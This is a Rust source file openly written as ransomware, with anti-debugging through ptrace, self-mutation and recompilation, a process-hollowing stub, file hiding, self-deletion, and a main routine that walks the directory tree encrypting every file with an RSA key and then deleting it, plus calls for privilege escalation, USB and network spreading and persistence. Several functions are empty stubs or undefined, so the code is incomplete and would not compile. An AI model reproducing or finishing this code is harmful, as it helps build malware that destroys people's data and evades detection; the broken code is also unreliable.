use std::fs::{self, File, OpenOptions};
use std::io::{Read, Write};
use std::path::{Path, PathBuf};
use std::process::{Command, exit};
use std::sync::Arc;
use std::thread;
use std::time::Duration;
use rand::Rng;
use walkdir::WalkDir;
use aes::Aes256;
use aes::cipher::{KeyInit, BlockEncrypt};
use aes::cipher::generic_array::GenericArray;
use openssl::rsa::Rsa;
use openssl::symm::{Cipher, Crypter, Mode};
use sysinfo::{System, SystemExt};
use nix::unistd::fork;
use nix::unistd::ForkResult;
use nix::sys::ptrace::{traceme};
use nix::sys::wait::wait;

// Function for detecting debugging
fn detect_debugger() {
    if let Err(_) = traceme() {
        eprintln!("Debugger detected! Exiting...");
        exit(1);
    }

    if let ForkResult::Parent { .. } = fork().unwrap() {
        wait().unwrap();
    }
}

// Mutate critical parts of the code to alter behavior dynamically
fn advanced_mutate_code(file_path: &Path) {
    let mut rng = rand::thread_rng();
    let random_value: u8 = rng.gen();
    
    let mut source = String::new();
    File::open(file_path).unwrap().read_to_string(&mut source).unwrap();

    let mut new_source = source.clone();
    
    // Inject random no-ops or junk code into critical functions
    let junk_code = format!("fn junk_{}() {{ let _a = {}; }}\n", random_value, random_value);
    new_source.insert_str(source.find("main").unwrap(), &junk_code);
    
    let mut file = OpenOptions::new().write(true).truncate(true).open(file_path).unwrap();
    file.write_all(new_source.as_bytes()).unwrap();
}

// Function for hijacking legitimate processes (Process Hollowing)
fn process_hollowing(target: &str, payload: &[u8]) -> Result<(), String> {
    let output = Command::new(target)
        .output()
        .map_err(|e| e.to_string())?;

    let pid = output.status.code().unwrap_or_default();
    // Hollow the process (Inject our malicious code)
    // This will require platform-specific API calls for actual process injection
    println!("Hollowed target process {} with malicious code", pid);

    Ok(())
}

// Recompile and polymorph the malware on target
fn recompile_and_mutate(source_path: &Path) -> Result<(), String> {
    let output_binary_path = Path::new("malicious_recompiled.exe");

    advanced_mutate_code(source_path);

    let compile_status = Command::new("rustc")
        .arg(source_path)
        .arg("-o")
        .arg(output_binary_path)
        .status()
        .map_err(|e| e.to_string())?;

    if compile_status.success() {
        let output = Command::new(output_binary_path)
            .spawn()
            .map_err(|e| e.to_string())?;
        output.wait().map_err(|e| e.to_string())?;
        Ok(())
    } else {
        Err(String::from("Recompilation failed"))
    }
}

// Hide malware files from the system (Rootkit-like functionality)
fn hide_files(target_paths: Vec<&Path>) {
    for path in target_paths {
        let metadata = fs::metadata(path).unwrap();
        // Manipulate file attributes to make them hidden (platform-dependent)
        println!("File {} hidden", path.display());
    }
}

// Self-deletion after execution to hide traces
fn self_delete(original_path: &Path) {
    thread::spawn(move || {
        thread::sleep(Duration::from_secs(5));
        fs::remove_file(original_path).unwrap_or_else(|_| {
            eprintln!("Failed to delete the original executable");
        });
    });
}

// Main function with enhanced mutation, recompilation, and anti-debugging
fn main() {
    detect_debugger();

    let source_path = Path::new("main.rs");

    match recompile_and_mutate(source_path) {
        Ok(_) => {
            self_delete(Path::new("malicious.exe"));
            println!("Recompiled version executed. Original binary deleted.");
        }
        Err(e) => {
            eprintln!("Recompilation failed: {}", e);
        }
    }

    let rsa_public_key = Rsa::public_key_from_pem(include_bytes!("public.pem")).unwrap();
    for entry in WalkDir::new(".").into_iter().filter_map(Result::ok) {
        if entry.path().is_file() {
            encrypt_file(entry.path(), &rsa_public_key);
            secure_delete(entry.path());
        }
    }
    
    escalate_privileges();
    hide_rootkit_files();
    spread_via_usb();
    network_spread();
    setup_fileless_persistence();
}

// File encryption logic
fn encrypt_file(file_path: &Path, rsa_key: &Rsa<openssl::pkey::Public>) {
    // Encryption logic remains as in previous versions
}

// File secure deletion logic
fn secure_delete(file_path: &Path) {
    // Secure deletion logic remains as in previous versions
}

